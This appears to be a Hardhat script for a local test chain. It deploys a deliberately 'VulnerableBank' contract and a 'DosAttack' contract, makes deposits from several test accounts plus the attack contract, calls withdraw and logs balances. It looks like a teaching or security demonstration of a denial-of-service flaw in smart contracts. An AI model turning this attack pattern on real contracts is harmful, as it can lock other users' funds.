import { ethers } from "hardhat";
import { Contract, formatEther, parseEther } from "ethers";
import {
  VulnerableBank__factory,
  VulnerableBank,
  DosAttack__factory,
  DosAttack,
} from "../typechain";

async function main() {
  const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

  const [userOne, userTwo, userThree, hacker] = await ethers.getSigners();

  const VulnerableBankFactory = new VulnerableBank__factory(userOne);

  const vulnerableBankContract = await VulnerableBankFactory.deploy();

  await vulnerableBankContract.waitForDeployment();

  const DosAttackContract = new DosAttack__factory(hacker);

  const dosAttackContract = await DosAttackContract.deploy(
    vulnerableBankContract.target
  );

  await dosAttackContract.waitForDeployment();

  console.log("START BALANCES");

  const tx1 = await vulnerableBankContract.connect(userOne).deposit({
    value: parseEther("2500"),
  });
  await tx1.wait();

  const tx2 = await vulnerableBankContract.connect(userTwo).deposit({
    value: parseEther("3500"),
  });
  await tx2.wait();

  const tx3 = await vulnerableBankContract.connect(userThree).deposit({
    value: parseEther("1000"),
  });
  await tx3.wait();

  const tx4 = await dosAttackContract.doDepositToBank({
    value: parseEther("100"),
  });
  await tx4.wait();

  console.log("");
  console.log("BALANCES BEFORE CALL WITHDRAW");

  console.log(
    "userOne balance: " +
      formatEther(
        (await provider.getBalance(await userOne.getAddress())).toString()
      )
  );
  console.log(
    "userTwo balance: " +
      formatEther(
        (await provider.getBalance(await userTwo.getAddress())).toString()
      )
  );
  console.log(
    "userThree balance: " +
      formatEther(
        (await provider.getBalance(await userThree.getAddress())).toString()
      )
  );
  // console.log(
  //   "vulnerableBankContract balance: " +
  //     formatEther((await vulnerableBankContract.currentBalance()).toString())
  // );

  console.log(
    "Contract balance before withdraw: " +
      formatEther(await vulnerableBankContract.currentBalance())
  );

  console.log(
    "UserOne contract balance: " +
      formatEther(await vulnerableBankContract.balances(userOne.address))
  );

  const allClientsLength = await vulnerableBankContract.getAllClientsLength();
  console.log("Total clients:", allClientsLength);

  const allClients = [];
  for (let i = 0; i < allClientsLength; i++) {
    const clientAddress = await vulnerableBankContract.allClients(i);
    allClients.push(clientAddress);
  }
  console.log("All clients:", allClients);

  const txWithdraw = await vulnerableBankContract.withdraw();
  await txWithdraw.wait();

  console.log("");
  console.log("BALANCES AFTER WITHDRAW");

  console.log(
    "Contract balance: " +
      formatEther(await vulnerableBankContract.currentBalance())
  );

  await new Promise((resolve) => setTimeout(resolve, 1000));

  console.log(
    "userOne balance: " +
      formatEther(
        (await provider.getBalance(await userOne.getAddress())).toString()
      )
  );
  console.log(
    "userTwo balance: " +
      formatEther(
        (await provider.getBalance(await userTwo.getAddress())).toString()
      )
  );
  console.log(
    "userThree balance: " +
      formatEther(
        (await provider.getBalance(await userThree.getAddress())).toString()
      )
  );
  //   console.log(
  //     "hacker balance: " +
  //       formatEther((await provider.getBalance(hacker.address)).toString())
  //   );
  //   console.log(
  //     "vulnerableBankContract balance: " +
  //       formatEther((await vulnerableBankContract.currentBalance()).toString())
  //   );
  //   console.log(
  //     "dosAttackContract balance: " +
  //       formatEther((await dosAttackContract.currentBalance()).toString())
  //   );
  console.groupEnd();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
